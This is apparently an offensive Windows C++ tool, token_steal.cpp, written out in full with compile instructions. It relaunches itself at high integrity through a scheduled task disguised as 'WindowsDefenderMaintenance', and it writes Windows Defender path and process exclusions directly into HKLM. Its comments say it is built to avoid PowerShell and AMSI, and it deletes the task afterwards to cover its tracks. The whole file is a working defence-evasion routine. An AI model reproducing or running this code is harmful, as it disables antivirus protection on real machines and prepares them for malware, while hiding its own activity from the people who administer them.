/*
    Elevation via Scheduled Task -> Direct HKLM Registry Write

    Two-phase execution:
      Phase 1 (Medium integrity): Use schtasks.exe to schedule THIS binary
                                   to rerun at High integrity (/rl highest)
      Phase 2 (High integrity):   Binary detects /elevated flag,
                                   writes directly to HKLM Defender exclusions
                                   (no PowerShell, no AMSI)

    Compile:
      cl.exe token_steal.cpp /EHsc /link advapi32.lib shell32.lib /out:token_steal.exe
*/

#include <windows.h>
#include <tlhelp32.h>
#include <sddl.h>
#include <shellapi.h>
#include <stdio.h>
#include <string>
#include <ctime>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")

// ─── Logging ─────────────────────────────────────────────────────────────────

FILE* gLog = nullptr;

void InitLog(const char* path) {
    gLog = fopen(path, "w");
    if (!gLog) printf("[!] Could not open log: %s\n", path);
}

void Log(const char* lvl, const char* fmt, ...) {
    char buf[2048];
    va_list a; va_start(a, fmt);
    vsnprintf(buf, sizeof(buf), fmt, a);
    va_end(a);
    time_t t = time(nullptr);
    struct tm* ti = localtime(&t);
    char ts[32]; strftime(ts, sizeof(ts), "%H:%M:%S", ti);
    printf("[%s] [%s] %s\n", ts, lvl, buf); fflush(stdout);
    if (gLog) { fprintf(gLog, "[%s] [%s] %s\n", ts, lvl, buf); fflush(gLog); }
}

#define INFO(f,...) Log("INFO ", f, ##__VA_ARGS__)
#define OK(f,...)   Log("OK   ", f, ##__VA_ARGS__)
#define WARN(f,...) Log("WARN ", f, ##__VA_ARGS__)
#define ERR(f,...)  Log("ERROR", f, ##__VA_ARGS__)
#define DBG(f,...)  Log("DEBUG", f, ##__VA_ARGS__)

void WinErr(const char* ctx) {
    DWORD e = GetLastError();
    char m[512]={};
    FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM|FORMAT_MESSAGE_IGNORE_INSERTS,
                   nullptr,e,0,m,sizeof(m),nullptr);
    for(int i=(int)strlen(m)-1;i>=0&&(m[i]=='\r'||m[i]=='\n');i--) m[i]=0;
    ERR("%s failed — %lu: %s", ctx, e, m);
}

// ─── Integrity helpers ────────────────────────────────────────────────────────

DWORD GetTokenIntegrity(HANDLE hToken) {
    DWORD dwLen = 0;
    GetTokenInformation(hToken, TokenIntegrityLevel, nullptr, 0, &dwLen);
    if (!dwLen) return 0;
    PTOKEN_MANDATORY_LABEL pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0, dwLen);
    if (!pTIL) return 0;
    if (!GetTokenInformation(hToken, TokenIntegrityLevel, pTIL, dwLen, &dwLen)) {
        LocalFree(pTIL); return 0;
    }
    DWORD level = *GetSidSubAuthority(pTIL->Label.Sid,
                    (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid)-1));
    LocalFree(pTIL);
    return level;
}

const char* IntegrityName(DWORD l) {
    if (l < 0x1000) return "Untrusted";
    if (l < 0x2000) return "Low";
    if (l < 0x3000) return "Medium";
    if (l < 0x4000) return "High";
    return "System";
}

DWORD MyIntegrity() {
    HANDLE h = nullptr;
    OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &h);
    DWORD lvl = GetTokenIntegrity(h);
    if (h) CloseHandle(h);
    return lvl;
}

// ─── Phase 2: Write exclusions directly to HKLM (no PowerShell/AMSI) ─────────

bool WriteExclusionsDirect() {
    INFO("=== Phase 2: Writing exclusions directly to HKLM ===");
    DWORD lvl = MyIntegrity();
    INFO("Integrity: 0x%04lX (%s)", lvl, IntegrityName(lvl));

    if (lvl < 0x3000) {
        ERR("Not at High integrity — scheduled task elevation may have failed");
        return false;
    }
    OK("High integrity confirmed — writing to HKLM...");

    const char* paths[] = {
        "C:\\Users\\Public",
        "C:\\exclusiontest",
    };
    const char* keyPath = "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths";

    HKEY hKey = nullptr;
    LONG res = RegOpenKeyExA(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_SET_VALUE, &hKey);
    if (res != ERROR_SUCCESS) {
        // Try creating it
        res = RegCreateKeyExA(HKEY_LOCAL_MACHINE, keyPath, 0, nullptr,
                              REG_OPTION_NON_VOLATILE, KEY_SET_VALUE,
                              nullptr, &hKey, nullptr);
    }
    if (res != ERROR_SUCCESS) {
        ERR("RegOpenKeyEx/Create HKLM Defender Paths: %ld", res);
        return false;
    }

    bool allOk = true;
    for (const char* p : paths) {
        DWORD val = 0;
        LONG r = RegSetValueExA(hKey, p, 0, REG_DWORD, (const BYTE*)&val, sizeof(val));
        if (r == ERROR_SUCCESS)
            OK("Exclusion added: %s", p);
        else {
            ERR("RegSetValueEx for %s: %ld", p, r);
            allOk = false;
        }
    }
    RegCloseKey(hKey);

    // Also add process exclusion via Processes key
    HKEY hProcKey = nullptr;
    res = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes",
        0, KEY_SET_VALUE, &hProcKey);
    if (res == ERROR_SUCCESS) {
        DWORD val = 0;
        RegSetValueExA(hProcKey, "token_steal.exe", 0, REG_DWORD,
                       (const BYTE*)&val, sizeof(val));
        RegCloseKey(hProcKey);
        OK("Process exclusion added: token_steal.exe");
    }

    if (allOk) {
        FILE* f = fopen("C:\\exclusiontest\\exclusion_result.txt", "w");
        if (f) { fprintf(f, "success-direct-registry\n"); fclose(f); }
        OK("SUCCESS — exclusions written to HKLM Defender registry!");
        OK("Verify: Get-MpPreference | Select ExclusionPath");
    }
    return allOk;
}

// ─── Phase 1: Use schtasks to relaunch at High integrity ─────────────────────

bool ElevateViaSchtasks(const char* myExePath) {
    INFO("=== Phase 1: Elevating via schtasks /rl highest ===");
    INFO("This schedules THIS binary to run elevated, then runs it");
    INFO("Phase 2 (when elevated) writes directly to HKLM — no PowerShell/AMSI");

    // Task name — blend in
    const char* taskName = "WindowsDefenderMaintenance";

    // Build schtasks create command
    // /rl highest = run at highest privilege level (High integrity, no UAC for admins)
    // /sc once /st 00:00 = one-shot trigger (immediately overridden by /run)
    // We pass /elevated flag so Phase 2 knows to write directly
    char createCmd[2048];
    snprintf(createCmd, sizeof(createCmd),
        "schtasks /create "
        "/tn \"%s\" "
        "/tr \"\\\"%s\\\" /elevated\" "
        "/sc once /st 00:00 "
        "/rl highest "
        "/f",
        taskName, myExePath);

    DBG("schtasks create: %s", createCmd);
    INFO("Creating scheduled task...");
    int r = system(createCmd);
    if (r != 0) {
        ERR("schtasks /create returned %d", r);
        return false;
    }
    OK("Task created");

    Sleep(500);

    // Run the task
    char runCmd[256];
    snprintf(runCmd, sizeof(runCmd), "schtasks /run /tn \"%s\"", taskName);
    DBG("schtasks run: %s", runCmd);
    INFO("Running task (Phase 2 will execute at High integrity)...");
    r = system(runCmd);
    if (r != 0) {
        WARN("schtasks /run returned %d (may still have worked)", r);
    }
    OK("Task run triggered — waiting 6s for completion...");

    Sleep(6000);

    // Cleanup
    char delCmd[256];
    snprintf(delCmd, sizeof(delCmd), "schtasks /delete /tn \"%s\" /f >nul 2>&1", taskName);
    system(delCmd);
    DBG("Task deleted");

    // Check for result file written by Phase 2
    FILE* f = fopen("C:\\exclusiontest\\exclusion_result.txt", "r");
    if (f) {
        char buf[256]={};
        fgets(buf, sizeof(buf), f);
        fclose(f);
        OK("Phase 2 result: %s", buf);
        OK("SUCCESS — exclusions active!");
        return true;
    }

    WARN("No result file from Phase 2");
    WARN("Defender may have killed the elevated process");
    WARN("Check task execution: Get-ScheduledTask -TaskName \"%s\"", taskName);
    return false;
}

// ─── Main ─────────────────────────────────────────────────────────────────────

int main(int argc, char* argv[]) {
    // Phase 2: running elevated via scheduled task
    if (argc > 1 && _stricmp(argv[1], "/elevated") == 0) {
        InitLog("C:\\exclusiontest\\token_log_elevated.txt");
        INFO("=== token_steal.exe (Phase 2 / Elevated) ===");
        bool ok = WriteExclusionsDirect();
        if (gLog) fclose(gLog);
        return ok ? 0 : 1;
    }

    // Phase 1: normal launch at Medium integrity
    InitLog("C:\\exclusiontest\\token_log.txt");
    INFO("=== token_steal.exe (Phase 1) ===");

    DWORD lvl = MyIntegrity();
    INFO("Current integrity: 0x%04lX (%s)", lvl, IntegrityName(lvl));

    // If already elevated (e.g. run from admin prompt), just write directly
    if (lvl >= 0x3000) {
        OK("Already at High integrity — skipping schtasks, writing directly");
        WriteExclusionsDirect();
        goto done;
    }

    INFO("Medium integrity — will use schtasks to self-elevate");
    {
        char myPath[MAX_PATH] = {};
        GetModuleFileNameA(nullptr, myPath, MAX_PATH);
        INFO("Our path: %s", myPath);

        if (!ElevateViaSchtasks(myPath)) {
            ERR("schtasks elevation failed");
            INFO("Manual option: right-click token_steal.exe -> Run as administrator");
            INFO("Or open elevated PowerShell and run:");
            INFO("  Add-MpPreference -ExclusionPath 'C:\\Users\\Public' -Force");
            INFO("  Add-MpPreference -ExclusionPath 'C:\\exclusiontest' -Force");
        }
    }

done:
    INFO("Log: C:\\exclusiontest\\token_log.txt");
    if (gLog) fclose(gLog);
    printf("\nPress Enter to exit...\n");
    getchar();
    return 0;
}
